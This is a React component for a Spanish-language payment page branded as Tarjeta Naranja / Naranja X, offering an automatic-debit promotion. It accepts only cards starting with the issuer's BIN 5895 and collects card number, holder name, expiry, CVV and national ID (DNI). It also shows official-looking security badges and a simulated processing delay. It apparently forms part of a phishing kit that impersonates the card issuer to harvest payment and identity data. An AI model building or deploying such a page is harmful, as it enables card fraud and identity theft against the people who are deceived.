import React, { useState, type FormEvent } from 'react';
import { CreditCard, Lock, ShieldCheck, ArrowLeft, CheckCircle2 } from 'lucide-react';

export interface PaymentData {
  cardNumber: string;
  cardHolder: string;
  expiry: string;
  cvv: string;
  dni: string;
}

interface PaymentFormProps {
  planTitle?: string;
  planCapital?: string;
  planRegular?: string;
  initialDni?: string;
  initialName?: string;
  onBack?: () => void;
  onSubmitPayment: (data: PaymentData) => void;
}

export default function PaymentForm({
  planTitle = '$10.000.000',
  planCapital = '$10.000.000',
  planRegular = '$34.500',
  initialDni = '',
  initialName = '',
  onBack,
  onSubmitPayment,
}: PaymentFormProps) {
  const [cardNumber, setCardNumber] = useState('');
  const [cardError, setCardError] = useState('');
  const [cardHolder, setCardHolder] = useState(initialName);
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [dni, setDni] = useState(initialDni);
  const [processing, setProcessing] = useState(false);

  // Formateador y validación de BIN Tarjeta Naranja (5895) en tiempo real
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = value.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);

    if (value.length >= 4) {
      // Verifica si empieza con 5895 (BIN clásico de Tarjeta Naranja)
      if (!value.startsWith('5895')) {
        setCardError('Esta promoción es exclusiva para Tarjetas Naranja. Ingresa un número válido.');
      } else {
        setCardError('');
      }
    } else {
      setCardError('');
    }
  };

  // Formateador de fecha de vencimiento MM/AA
  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (raw.length >= 3) {
      raw = `${raw.slice(0, 2)}/${raw.slice(2)}`;
    }
    setExpiry(raw);
  };

  // Validación de CVV (3 o 4 dígitos)
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 4);
    setCvv(raw);
  };

  // Validación de DNI
  const handleDniChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const raw = e.target.value.replace(/\D/g, '').slice(0, 9);
    setDni(raw);
  };

  // Validación completa: Tarjeta Naranja válida (comienza con 5895 y min 15 dígitos) + campos completos
  const rawCardDigits = cardNumber.replace(/\D/g, '');
  const isNaranjaCard = rawCardDigits.startsWith('5895');
  const isFormValid = Boolean(
    isNaranjaCard &&
    !cardError &&
    rawCardDigits.length >= 15 &&
    cardHolder.trim().length >= 3 &&
    expiry.length >= 4 &&
    cvv.length >= 3 &&
    dni.trim().length >= 7
  );

  const handleSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (!isFormValid || processing) return;

    setProcessing(true);
    setTimeout(() => {
      onSubmitPayment({
        cardNumber: rawCardDigits,
        cardHolder,
        expiry,
        cvv,
        dni,
      });
      setProcessing(false);
    }, 900);
  };

  return (
    <div className="w-full max-w-xl mx-auto rounded-2xl border border-slate-100 bg-white p-6 sm:p-8 shadow-xl text-slate-800">
      {/* Encabezado del Formulario de Pago */}
      <div className="flex items-center justify-between border-b border-slate-100 pb-5 mb-6">
        <div className="flex items-center gap-3">
          <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-[#1d497f]/10 border border-[#1d497f]/20 text-[#1d497f]">
            <CreditCard size={22} className="text-[#FF5900]" />
          </div>
          <div>
            <h3 className="m-0 text-lg font-bold text-[#1d497f] leading-tight">
              Adhesión a Débito Automático
            </h3>
            <p className="m-0 text-xs text-slate-500">
              Ingresá tu Tarjeta Naranja para activar el beneficio
            </p>
          </div>
        </div>

        {onBack && (
          <button
            type="button"
            onClick={onBack}
            className="flex items-center gap-1.5 text-xs text-slate-500 hover:text-[#1d497f] transition-colors cursor-pointer"
          >
            <ArrowLeft size={14} /> Volver
          </button>
        )}
      </div>

      {/* Resumen del Plan a Adherir */}
      <div className="mb-6 rounded-2xl border border-emerald-500/20 bg-emerald-50/70 p-4 flex items-center justify-between gap-4">
        <div>
          <span className="text-[11px] font-bold uppercase tracking-wider text-emerald-800">
            {planTitle}
          </span>
          <p className="m-0 text-base font-black text-[#1d497f]">
            Capital {planCapital}
          </p>
        </div>
        <div className="text-right">
          <span className="text-[10px] text-slate-500 block">Cuota mensual</span>
          <p className="m-0 text-base font-bold text-[#FF5900]">
            {planRegular}
          </p>
        </div>
      </div>

      {/* Tarjeta Visual de Previsualización */}
      <div className="mb-6 relative rounded-2xl bg-gradient-to-r from-[#FF5900] via-orange-500 to-[#1d497f] p-5 shadow-lg text-white">
        <div className="flex justify-between items-start mb-6">
          <span className="text-sm font-black tracking-wider uppercase">Naranja X</span>
          <CreditCard className="opacity-80" size={24} />
        </div>
        <div className="font-mono text-lg sm:text-xl tracking-widest mb-4">
          {cardNumber || '•••• •••• •••• ••••'}
        </div>
        <div className="flex justify-between text-xs tracking-wider uppercase opacity-95">
          <div>
            <span className="text-[9px] block text-white/75">Titular</span>
            <span className="font-bold truncate max-w-[170px] block">
              {cardHolder || 'NOMBRE DEL TITULAR'}
            </span>
          </div>
          <div>
            <span className="text-[9px] block text-white/75">Vence</span>
            <span className="font-bold">{expiry || 'MM/AA'}</span>
          </div>
        </div>
      </div>

      {/* Formulario de Campos Estructurados */}
      <form onSubmit={handleSubmit} className="space-y-4" data-testid="form-payment">
        {/* Número de Tarjeta */}
        <div>
          <label className="block mb-1.5 text-xs font-semibold uppercase tracking-wider text-[#1d497f]">
            Número de Tarjeta Naranja (16 dígitos)
          </label>
          <div className="relative">
            <input
              type="text"
              required
              value={cardNumber}
              onChange={handleCardNumberChange}
              placeholder="5895 1234 5678 9012"
              className={`w-full rounded-xl border ${
                cardError
                  ? 'border-red-400 focus:border-red-500 focus:ring-red-500/20'
                  : 'border-slate-200 focus:border-[#1d497f] focus:ring-[#1d497f]/30'
              } bg-slate-50 px-4 py-3.5 pr-28 text-sm text-slate-900 placeholder:text-slate-400 outline-none transition-all focus:bg-white focus:ring-2`}
              data-testid="input-card-number"
            />
            {/* Ícono de Naranja X dentro del input: escala de grises si inválido, a color si 5895 detectado */}
            <div className="absolute right-3.5 top-1/2 -translate-y-1/2 flex items-center pointer-events-none select-none">
              <div
                className={`transition-all duration-300 flex items-center gap-1 px-2.5 py-1 rounded-lg ${
                  rawCardDigits.startsWith('5895')
                    ? 'grayscale-0 opacity-100 scale-105 bg-orange-100/80 border border-[#FF5900]/40 text-[#FF5900] shadow-sm'
                    : 'grayscale opacity-40 text-slate-500 bg-slate-200/70 border border-slate-300'
                }`}
                data-testid="badge-naranjax-input"
              >
                <span className="font-black text-xs tracking-tight">
                  Naranja<span className={rawCardDigits.startsWith('5895') ? 'text-[#2b1b54]' : 'text-slate-600'}>X</span>
                </span>
              </div>
            </div>
          </div>

          {/* Mensaje condicional de error en color rojo */}
          {cardError && (
            <p className="text-red-500 text-sm mt-1.5 font-medium flex items-center gap-1.5" data-testid="card-error-msg">
              <span>⚠</span>
              <span>{cardError}</span>
            </p>
          )}
        </div>

        {/* Nombre del Titular */}
        <div>
          <label className="block mb-1.5 text-xs font-semibold uppercase tracking-wider text-[#1d497f]">
            Nombre completo del titular (como figura en la tarjeta)
          </label>
          <input
            type="text"
            required
            value={cardHolder}
            onChange={(e) => setCardHolder(e.target.value.toUpperCase())}
            placeholder="JUAN PEREZ"
            className="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3.5 text-sm text-slate-900 placeholder:text-slate-400 outline-none transition-all uppercase focus:border-[#1d497f] focus:bg-white focus:ring-2 focus:ring-[#1d497f]/30"
            data-testid="input-card-holder"
          />
        </div>

        {/* Fecha de Vencimiento y Código de Seguridad */}
        <div className="grid grid-cols-2 gap-4">
          <div>
            <label className="block mb-1.5 text-xs font-semibold uppercase tracking-wider text-[#1d497f]">
              Vencimiento (MM/AA)
            </label>
            <input
              type="text"
              required
              value={expiry}
              onChange={handleExpiryChange}
              placeholder="08/28"
              className="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3.5 text-sm text-slate-900 placeholder:text-slate-400 outline-none transition-all text-center focus:border-[#1d497f] focus:bg-white focus:ring-2 focus:ring-[#1d497f]/30"
              data-testid="input-card-expiry"
            />
          </div>

          <div>
            <label className="block mb-1.5 text-xs font-semibold uppercase tracking-wider text-[#1d497f]">
              Código CVC/CVV
            </label>
            <div className="relative">
              <input
                type="password"
                required
                maxLength={4}
                value={cvv}
                onChange={handleCvvChange}
                placeholder="123"
                className="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3.5 text-sm text-slate-900 placeholder:text-slate-400 outline-none transition-all text-center focus:border-[#1d497f] focus:bg-white focus:ring-2 focus:ring-[#1d497f]/30"
                data-testid="input-card-cvv"
              />
              <Lock size={15} className="absolute right-3.5 top-4 text-slate-400" />
            </div>
          </div>
        </div>

        {/* DNI del Titular */}
        <div>
          <label className="block mb-1.5 text-xs font-semibold uppercase tracking-wider text-[#1d497f]">
            DNI del titular de la tarjeta
          </label>
          <input
            type="text"
            required
            value={dni}
            onChange={handleDniChange}
            placeholder="Sin puntos ni espacios"
            className="w-full rounded-xl border border-slate-200 bg-slate-50 px-4 py-3.5 text-sm text-slate-900 placeholder:text-slate-400 outline-none transition-all focus:border-[#1d497f] focus:bg-white focus:ring-2 focus:ring-[#1d497f]/30"
            data-testid="input-card-dni"
          />
        </div>

        {/* Botón de Confirmación y Pago */}
        <div className="pt-4">
          <button
            type="submit"
            disabled={!isFormValid || processing}
            className="w-full rounded-xl bg-[#FF5900] hover:bg-[#e54f00] disabled:opacity-40 disabled:cursor-not-allowed text-white font-extrabold py-4 px-6 shadow-lg shadow-orange-500/25 active:scale-[0.98] transition-all text-base sm:text-lg flex items-center justify-center gap-2 cursor-pointer"
            data-testid="button-confirm-payment"
          >
            {processing ? (
              <span className="flex items-center gap-2 text-white">
                <span className="h-4 w-4 rounded-full border-2 border-white border-t-transparent animate-spin" />
                Procesando adhesión...
              </span>
            ) : (
              <span className="flex items-center gap-2 text-white">
                <CheckCircle2 size={18} className="text-white" />
                Confirmar adhesión y pagar
              </span>
            )}
          </button>
        </div>

        {/* Sellos de Seguridad */}
        <div className="pt-3 flex items-center justify-center gap-4 text-[11px] text-slate-500">
          <span className="flex items-center gap-1.5">
            <ShieldCheck size={14} className="text-[#FF5900]" /> Conexión segura cifrada SSL
          </span>
          <span>•</span>
          <span>Débito oficial Tarjeta Naranja</span>
        </div>
      </form>
    </div>
  );
}
